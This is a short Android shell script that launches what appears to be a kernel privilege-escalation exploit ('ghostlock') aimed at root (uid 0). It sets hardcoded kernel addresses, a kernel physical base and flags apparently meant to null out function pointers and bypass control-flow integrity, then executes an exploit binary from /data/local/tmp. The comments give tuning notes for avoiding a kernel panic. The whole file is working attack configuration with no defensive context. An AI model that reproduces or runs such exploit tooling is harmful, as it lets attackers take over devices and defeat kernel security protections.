#!/system/bin/sh
# W1-only leaf-NULL *funcs=0. Full uid0 path is gl_run_hookcred.sh.
# Do NOT use tree_pc=0 (T1 KP). Stamp is now leaf parent=target-8.
export MODE4_ONLY=1
export MODE4_SLIDE_ZERO=1
export MODE4_NULL_STORE=1
export MODE4_SWAP_NOCFI=1
export SLIDE_P0_TARGET=0xffffff802a950700
export DATAONLY_TARGET=0x2950700
export KPHYS=0xa8000000
export GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log
export GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt
export GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log
cd /data/local/tmp
exec /data/local/tmp/gl_uid0
